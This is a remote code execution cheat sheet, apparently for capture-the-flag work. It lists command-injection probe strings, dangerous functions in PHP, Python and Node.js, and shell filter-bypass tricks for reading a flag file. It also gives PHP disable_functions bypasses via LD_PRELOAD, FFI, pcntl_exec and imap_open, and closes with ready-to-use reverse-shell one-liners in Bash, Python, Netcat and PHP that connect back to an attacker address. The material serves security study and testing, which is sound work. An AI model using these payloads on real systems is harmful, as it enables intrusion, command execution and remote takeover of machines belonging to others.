# Remote Code Execution (RCE)

## Command Injection Detection
```
; id
| id
|| id
& id
&& id
`id`
$(id)
%0aid
\nid
```

## Common Vulnerable Functions
### PHP
```php
system(), exec(), passthru(), shell_exec(), popen(), proc_open()
eval(), assert(), preg_replace() with /e modifier
include(), require(), include_once(), require_once()  // LFI/RFI
unserialize()  // Deserialization
```

### Python
```python
os.system(), os.popen(), subprocess.call(), subprocess.Popen()
eval(), exec(), compile()
pickle.loads()  // Deserialization
yaml.load()     // YAML deserialization
```

### Node.js
```javascript
eval(), child_process.exec(), child_process.spawn()
require('child_process').execSync()
new Function()
vm.runInNewContext()
```

## Filter Bypass Techniques
```bash
# Space bypass
cat${IFS}/flag
cat$IFS/flag
{cat,/flag}
cat</flag
X=$'\x20';cat${X}/flag

# Keyword bypass (e.g., 'cat' blocked)
c\at /flag
c''at /flag
c""at /flag
/bin/c?t /flag
tac /flag
nl /flag
head /flag
tail /flag
sort /flag
rev /flag | rev
base64 /flag | base64 -d

# Slash bypass
cat ${HOME:0:1}flag

# Backtick / $() execution
`cat /flag`
$(cat /flag)
```

## PHP Disable Function Bypass
```php
// Using LD_PRELOAD
putenv("LD_PRELOAD=/tmp/evil.so"); mail('','','','');

// Using FFI (PHP 7.4+)
$ffi = FFI::cdef("int system(const char *command);");
$ffi->system("id");

// Using pcntl_exec
pcntl_exec("/bin/bash", ["-c", "cat /flag"]);

// Using imap_open
imap_open('{localhost:143/imap}INBOX', '', '', 0, 1, ['/tmp/x\nCMD: cat /flag']);
```

## Reverse Shell Payloads
```bash
# Bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Netcat
nc -e /bin/sh ATTACKER_IP PORT
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f

# PHP
php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```
